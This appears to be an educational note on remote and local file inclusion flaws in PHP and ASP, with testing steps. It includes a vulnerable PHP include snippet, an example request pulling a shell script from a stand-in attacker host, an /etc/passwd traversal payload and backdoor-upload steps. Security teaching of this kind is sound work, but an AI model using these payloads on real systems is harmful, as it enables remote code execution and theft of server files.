# File Inclusion Vulnerabilities

Many scripting languages support file inclusion to help developers modularize code. However, if user input is passed directly to file inclusion functions, it can lead to serious security flaws. When exploited, file inclusion vulnerabilities can allow attackers to execute arbitrary scripts, disclose sensitive content, or bypass access controls.

---

## Remote File Inclusion (RFI)

PHP is particularly vulnerable because its `include()` and `require()` functions can accept URLs. If user input is used without validation, an attacker can make the server fetch and execute a script from an external domain.

* **Example**:
  ```php
  $country = $_GET['Country'];
  include($country . '.php');
  ```
  - A benign request might be:  
    `https://wahh-app.com/main.php?Country=US`
  - A malicious one could be:  
    `https://wahh-app.com/main.php?Country=http://attacker.com/shell`

* If the application allows this, the attacker’s script (hosted on `attacker.com`) will be fetched and executed as part of the application, leading to **remote code execution**.

---

## Local File Inclusion (LFI)

Even when remote URLs are disallowed, attackers may still exploit local file inclusion by injecting paths to local server-side resources.

* **Example attack vectors**:
  - Bypass access restrictions by including files from protected directories (e.g., `/admin/config.asp`).
  - Include static resources (e.g., images, logs) to extract content by injecting their paths into dynamic include statements.

* ASP’s `Server.Execute()` or PHP’s `include()` functions are often vulnerable when they accept user-controlled paths without validation.

---

## Exploitation Scenarios

Local file inclusion can be used to:

* Execute arbitrary server-side scripts if they reside in accessible locations.
* Access hidden or protected application functionality by including it from a publicly accessible page.
* Extract contents of static resources (HTML, logs, config files) that are normally inaccessible.
* Combine with traversal techniques (`../`) to include sensitive files outside the intended directory.

---

## Finding File Inclusion Vulnerabilities

File inclusion flaws often exist in parameters that determine language, theme, or content location. Any file-related input should be considered suspicious.

---

## HACK STEPS

**Testing for Remote File Inclusion (RFI)**:
1. Inject a full URL pointing to a file on a server you control.
   - If the target server requests your file, the parameter is likely vulnerable.
2. Use a bogus IP address (e.g., `http://192.0.2.1/backdoor`) and watch for connection timeouts.
   - This helps detect attempts to connect out, even if your server isn’t contacted.
3. If successful, upload a malicious script using the language’s supported syntax (e.g., PHP backdoor) and invoke it via the vulnerable parameter.

**Testing for Local File Inclusion (LFI)**:
1. Supply the name of a known executable file on the server (e.g., `admin.php`) and observe any behavior change.
2. Supply a static file (e.g., image or log file) and check if its contents are reflected in the response.
3. Try accessing sensitive or restricted functionality by including those files through the vulnerable parameter.
4. Attempt directory traversal to escape the expected file path and access files in other locations:
   - Payload example: `?page=../../../../etc/passwd`

---

## Summary

* RFI allows remote attacker-controlled scripts to be executed by the server.
* LFI enables inclusion of local server files, often resulting in information disclosure or privilege escalation.
* Both can lead to full system compromise, especially if combined with upload features or poorly configured file permissions.
